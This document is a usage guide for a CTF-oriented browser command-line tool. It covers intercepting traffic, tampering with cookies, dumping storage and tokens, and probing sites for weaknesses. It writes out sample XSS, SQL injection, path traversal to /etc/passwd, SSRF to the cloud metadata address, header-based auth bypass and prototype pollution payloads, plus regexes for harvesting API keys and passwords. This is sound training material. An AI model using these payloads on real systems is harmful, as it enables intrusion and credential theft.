# Advanced Usage Guide - WebCTF CLI

## Table of Contents
1. [Network Traffic Analysis](#network-traffic-analysis)
2. [Cookie and Session Manipulation](#cookie-and-session-manipulation)
3. [JavaScript Exploitation](#javascript-exploitation)
4. [Form and CSRF Analysis](#form-and-csrf-analysis)
5. [Security Testing](#security-testing)
6. [Advanced Techniques](#advanced-techniques)

## Network Traffic Analysis

### Intercepting All Requests
```javascript
webctf> intercept on
→ GET https://api.example.com/user
← 200 https://api.example.com/user
→ POST https://api.example.com/login
← 401 https://api.example.com/login
```

### Filtering Network Traffic
```javascript
// Show only POST requests
webctf> requests POST

// Show API calls only
webctf> requests api

// Show last 5 requests
webctf> requests "" 5
```

### Analyzing Request/Response Headers
```javascript
// View response headers
webctf> headers response

// View specific request headers
webctf> headers request login

// Look for security headers
webctf> headers response
```

**What to look for:**
- `X-Powered-By`: Technology disclosure
- `Server`: Server version information
- `Set-Cookie`: Session cookies, flags
- `X-Flag`: Custom headers (common in CTFs)
- Missing security headers (CSP, HSTS, X-Frame-Options)

### Exporting Traffic for Analysis
```javascript
// Export as HAR file for Burp/ZAP
webctf> har capture.har
```

## Cookie and Session Manipulation

### Viewing Cookies
```javascript
webctf> cookies
```

**Common cookie vulnerabilities:**
- Predictable session IDs
- Missing HttpOnly flag
- Missing Secure flag
- Role/admin flags in cookies

### Setting Custom Cookies
```javascript
// Set admin cookie
webctf> setcookie admin true

// Set role cookie
webctf> setcookie role administrator

// Set session with specific domain
webctf> setcookie session_id abc123
```

### Cookie-Based Authentication Bypass
```javascript
// Common attack pattern
webctf> go https://target.com/login
webctf> cookies
// Note cookie structure
webctf> setcookie user_role admin
webctf> go https://target.com/dashboard
```

## JavaScript Exploitation

### Enumerating Global Variables
```javascript
// List all window properties
webctf> js Object.keys(window)

// Find non-standard globals
webctf> js Object.keys(window).filter(k => !k.startsWith('webkit'))

// Check for common secret variables
webctf> js window.API_KEY
webctf> js window.SECRET
webctf> js window.FLAG
```

### Accessing localStorage and sessionStorage
```javascript
// Dump all localStorage
webctf> js JSON.stringify(localStorage)

// Get specific item
webctf> js localStorage.getItem('auth_token')

// Look for JWT tokens
webctf> js Object.values(localStorage).find(v => v.match(/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*$/))
```

### Executing Complex JavaScript
```javascript
// Extract all forms
webctf> js Array.from(document.forms).map(f => ({
  action: f.action,
  method: f.method,
  inputs: Array.from(f.elements).map(e => e.name)
}))

// Find all links to admin pages
webctf> js Array.from(document.links).filter(a => 
  a.href.includes('admin')).map(a => a.href)

// Extract comments
webctf> js document.documentElement.innerHTML.match(/<!--[\s\S]*?-->/g)
```

### DOM Manipulation
```javascript
// Make hidden elements visible
webctf> js document.querySelectorAll('[type="hidden"]').forEach(el => {
  el.type = 'text';
  el.style.display = 'block';
})

// Disable form validation
webctf> js document.querySelectorAll('form').forEach(f => 
  f.setAttribute('novalidate', 'true'))

// Show all iframes
webctf> js Array.from(document.querySelectorAll('iframe')).map(f => f.src)
```

## Form and CSRF Analysis

### Extracting Form Data
```javascript
// Extract all forms
webctf> dom form

// Find CSRF tokens
webctf> js Array.from(document.querySelectorAll('[name*="csrf"]')).map(el => ({
  name: el.name,
  value: el.value
}))

// Find hidden inputs
webctf> js Array.from(document.querySelectorAll('input[type="hidden"]')).map(el => ({
  name: el.name,
  value: el.value
}))
```

### Analyzing Token Generation
```javascript
// Check if token changes on reload
webctf> js document.querySelector('[name="csrf_token"]').value
webctf> reload
webctf> js document.querySelector('[name="csrf_token"]').value
```

## Security Testing

### Testing for XSS
```javascript
// Basic XSS payloads
webctf> go https://target.com/search?q=<script>alert(1)</script>
webctf> go https://target.com/search?q="><img src=x onerror=alert(1)>

// Check if payload executed
webctf> console
```

### Testing for SQL Injection
```javascript
// Common SQLi payloads
webctf> go https://target.com/user?id=1' OR '1'='1
webctf> go https://target.com/user?id=1' UNION SELECT NULL--

// Check response for SQL errors
webctf> search "SQL syntax|mysql_fetch|PostgreSQL"
```

### Testing for Directory Traversal
```javascript
webctf> go https://target.com/download?file=../../../etc/passwd
webctf> go https://target.com/download?file=....//....//etc/passwd
```

### Testing for SSRF
```javascript
// Internal endpoints
webctf> go https://target.com/fetch?url=http://localhost:8080
webctf> go https://target.com/fetch?url=http://169.254.169.254/

// Check metadata endpoints
webctf> go https://target.com/proxy?url=http://169.254.169.254/latest/meta-data/
```

## Advanced Techniques

### Finding Hidden Endpoints
```javascript
// Check robots.txt
webctf> go https://target.com/robots.txt

// Check sitemap
webctf> go https://target.com/sitemap.xml

// Look for API endpoints in JS
webctf> search "api/|/v[0-9]/|endpoint"
```

### Analyzing JavaScript Files
```javascript
// Find all script sources
webctf> js Array.from(document.scripts).map(s => s.src)

// Search for API keys in source
webctf> search "api[_-]?key|apikey|api_secret|access[_-]?token"

// Find webpack bundles
webctf> search "webpack|bundle\.js"
```

### WebSocket Analysis
```javascript
// Check for WebSocket connections
webctf> js window.WebSocket

// Monitor WebSocket in console
webctf> console websocket
```

### Rate Limiting Testing
```javascript
// Send multiple requests quickly
webctf> go https://target.com/api/endpoint
webctf> go https://target.com/api/endpoint
webctf> go https://target.com/api/endpoint
// Check for 429 Too Many Requests
```

### Header Injection Attacks
```javascript
// Test various header injections
webctf> setheader X-Forwarded-For 127.0.0.1
webctf> setheader X-Original-URL /admin
webctf> setheader X-Rewrite-URL /admin
webctf> go https://target.com/
```

### JWT Token Analysis
```javascript
// Extract JWT from storage
webctf> js localStorage.getItem('token')

// Decode JWT (use external tool)
// Check for weak signing algorithms (none, HS256 with weak secret)
```

### Race Condition Testing
```javascript
// Open multiple tabs/contexts to test for race conditions
// Useful for voucher redemption, file upload timing, etc.
```

### Finding Comments and Debug Info
```javascript
// Search for HTML comments
webctf> search "<!--[\s\S]*?-->"

// Search for TODO/FIXME
webctf> search "TODO|FIXME|HACK|XXX|DEBUG"

// Check console for debug logs
webctf> console
```

### Source Map Analysis
```javascript
// Check for source maps
webctf> search "sourceMappingURL"

// Look for .map files
webctf> requests .map
```

### Prototype Pollution Testing
```javascript
// Test for prototype pollution
webctf> js constructor.prototype.polluted = 'yes'
webctf> js {}.polluted
```

### Testing Authentication Bypass
```javascript
// Common bypass techniques
webctf> go https://target.com/admin
webctf> setheader X-Original-URL /admin
webctf> go https://target.com/

// Try different HTTP methods
webctf> go https://target.com/admin (with POST, PUT, etc.)
```

## CTF-Specific Tips

### Finding Flags
```javascript
// Search for common flag formats
webctf> search "flag\{[^}]+\}"
webctf> search "ctf\{[^}]+\}"
webctf> search "[A-Z0-9]{32}"

// Check all storage
webctf> storage
webctf> cookies
webctf> console
```

### Checking HTTP Methods
```javascript
// Look for allowed methods in headers
webctf> headers response
// Check for: Allow, Access-Control-Allow-Methods
```

### Testing Parameter Pollution
```javascript
webctf> go https://target.com/api?id=1&id=2
webctf> go https://target.com/api?id[]=1&id[]=2
```

### Analyzing WebAssembly
```javascript
// Check for WebAssembly
webctf> js window.WebAssembly

// Find .wasm files
webctf> requests .wasm
```

### GraphQL Enumeration
```javascript
// Test introspection
webctf> go https://target.com/graphql?query={__schema{types{name}}}
```

## Common CTF Patterns

1. **Base64 Encoded Flags**: Check all base64 strings
2. **JWT Tokens**: Decode and check for role manipulation
3. **Cookie Manipulation**: Change role/admin flags
4. **Source Code Comments**: Developers leave hints
5. **Hidden Form Fields**: Contains secrets or flags
6. **localStorage**: Often contains sensitive data
7. **API Endpoints**: Check network tab for hidden APIs
8. **Custom Headers**: X-Flag, X-Secret are common
9. **JavaScript Variables**: window.FLAG is common
10. **Console Logs**: Debug messages with flags

## Useful Regex Patterns

```javascript
// Flags
flag\{[^}]+\}
ctf\{[^}]+\}
[A-Z0-9]{32}

// API Keys
api[_-]?key.*[=:]\s*['"][^'"]+['"]
secret.*[=:]\s*['"][^'"]+['"]

// Credentials
password.*[=:]\s*['"][^'"]+['"]
passwd.*[=:]\s*['"][^'"]+['"]

// Tokens
token.*[=:]\s*['"][^'"]+['"]
auth.*[=:]\s*['"][^'"]+['"]

// JWT
[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*

// IPv4
\b(?:\d{1,3}\.){3}\d{1,3}\b

// Email
[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}
```

## Automation Scripts

### Script to dump all data
```javascript
// Create a comprehensive dump
webctf> js ({
  url: location.href,
  title: document.title,
  cookies: document.cookie,
  localStorage: {...localStorage},
  sessionStorage: {...sessionStorage},
  globals: Object.keys(window).filter(k => !k.startsWith('webkit')),
  forms: Array.from(document.forms).map(f => ({
    action: f.action,
    method: f.method
  }))
})
```

### Check all common endpoints
```bash
# Use with the tool to test common paths
/admin
/api/v1/
/api/v2/
/debug
/.git/
/config
/backup
```

## Best Practices

1. **Always save evidence**: Use `screenshot` and `har` commands
2. **Document your process**: Keep notes of what you try
3. **Check everything**: Network, cookies, storage, console, source
4. **Think like a developer**: Where would you hide a flag?
5. **Read the challenge**: Hints are often in the description
6. **Try variations**: admin, administrator, root, etc.
7. **Check case sensitivity**: Try different capitalizations
8. **Look for patterns**: CTFs often have themes or patterns
9. **Test edge cases**: Empty values, negative numbers, special chars
10. **Use encoding tools**: Base64, URL, hex are common

## Troubleshooting

**Problem**: Can't see network requests
**Solution**: Enable intercept mode: `webctf> intercept on`

**Problem**: Page not loading
**Solution**: Check if JavaScript is required: `webctf> console`

**Problem**: Cookie not being sent
**Solution**: Check domain and path settings

**Problem**: Can't find the flag
**Solution**: Check all locations: network, cookies, storage, console, source, DOM

## Additional Resources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

Happy hacking! Remember to only use these techniques on systems you have permission to test.
